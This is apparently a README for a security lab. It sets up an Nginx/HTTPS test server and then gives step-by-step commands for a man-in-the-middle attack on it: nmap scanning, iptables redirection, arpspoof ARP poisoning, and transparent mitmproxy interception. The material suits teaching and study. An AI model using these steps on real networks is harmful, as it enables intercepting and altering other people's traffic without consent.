# Man-in-the-Middle Attack via ARP Spoofing

This project explores Man-in-the-Middle attack techniques using ARP spoofing to intercept, analyze, and modify network traffic between a client and a server.

- [Server Configuration](#1-Server-Configuration)
- [MitM Configuration](#2-MitM-Configuration)

## 1. Server Configuration

### 1.1 Installing Nginx

```
$ sudo apt install nginx -y
```

### 1.2 Generating a Self-Signed Certificate

Create a directory for SSL certificates:

```
$ sudo mkdir -p /etc/nginx/ssl
```

Generate a self-signed certificate using OpenSSL:

```
$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-keyout /etc/nginx/ssl/nginx-selfsigned.key \
-out /etc/nginx/ssl/nginx-selfsigned.crt
```

**Parameter Descriptions**:

- `-x509`: creates a certificate in x509 format.
- `-nodes`: disables passphrase request for the private key.
- `-days 365`: sets the certificate validity period to 365 days.
- `-newkey rsa:2048`: generates a new 2048-bit RSA key.

### 1.3 Configuring Nginx

```
$ sudo nano /etc/nginx/sites-available/default
```

Add the following configuration, replacing `<IP_addr>` with the server’s IP address:

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name <IP_addr>;

    # Redirect from HTTP to HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name <IP_addr>;

    ssl_certificate /etc/nginx/ssl/nginx-selfsigned.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx-selfsigned.key;

    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### 1.4 Verifying and Restarting Nginx

Verify the configuration and restart the service:

```
$ sudo nginx -t
$ sudo systemctl restart nginx
```

### 1.5 Starting Docker Containers

Clone the repository and start the containers:

```
$ git clone https://github.com/SenapeDev/CySec.git
$ cd server
$ docker compose up --build -d
```

### 1.6 Managing HTTPS Mode

To enable or disable HTTPS using the Makefile:

```
$ make https-on
$ make https-off
```

- `https-on`: enables redirection to HTTPS.
- `https-off`: disables HTTPS redirection, returning to HTTP.

---

## 2. MitM Configuration

### 2.1 Installing Nmap

```
$ sudo apt install nmap -y
```

### 2.2 Scanning the Local Network with Nmap

To find the IP address of the host running the website within the local network, execute:

```
$ nmap -p 80,443 --open -sV <IP_range>
```

**Parameter Descriptions**:

- `-sV` detects active services and attempts to identify the web application in use.
- `--open` shows only hosts with open ports.
- `<IP_range>` is the IP address range for scanning.

### 2.3 Enabling Packet Forwarding

Enable packet forwarding to allow packet transmission between the server and the victim:

```
# echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 2.4 Configuring iptables for Traffic Redirection

Redirect HTTP traffic to port 8080 (used by `mitmproxy`):

```
$ sudo iptables -t nat -A PREROUTING -p tcp -s <src_IP> --dport 80 -j REDIRECT --to-port 8080
```

This command uses the `nat` table in iptables to redirect traffic intended for port 80 on the specified address to port 8080. These changes are temporary and will be removed upon reboot.

### 2.5 Checking Set Rules

To check active `iptables` rules:

```
$ sudo iptables -t nat -L -v -n
```

The command lists all rules in the iptables `nat` table with details (`-v`) and without name resolution (`-n`).

### 2.6 Installing dsniff

Install `dsniff` to perform ARP spoofing:

```
$ sudo apt install dsniff
```

### 2.7 Performing ARP Poisoning

Use `arpspoof` to trick the victim into thinking they are communicating with the server:

```
# arpspoof -i <interface> -t <src_IP> <dest_IP>
```

This command sends ARP packets to the victim’s IP address (`<src_IP>`) to set the `<dest_IP>` (the impersonated server) as the sender, using the specified network interface (`<interface>`).

### 2.8 Installing Wireshark

To capture and analyze network traffic, install Wireshark:

```
$ sudo apt install wireshark -y
```

### 2.9 Capturing Packets with Wireshark

Start Wireshark to capture traffic:

```
$ sudo wireshark
```

### 2.10 Installing mitmproxy

Install `mitmproxy` to manipulate requests:

```
$ pip install mitmproxy
```

### 2.11 Installing the Script for mitmproxy

```
$ git clone https://github.com/SenapeDev/CySec.git
```

### 2.12 Intercepting and Modifying Requests with mitmproxy

Run `mitmproxy` in transparent mode to intercept and modify HTTP traffic:

```
$ cd mitm
$ mitmproxy -s main.py --mode transparent
```

This command starts `mitmproxy` in transparent mode (`--mode transparent`) to intercept traffic without any configuration on the client.
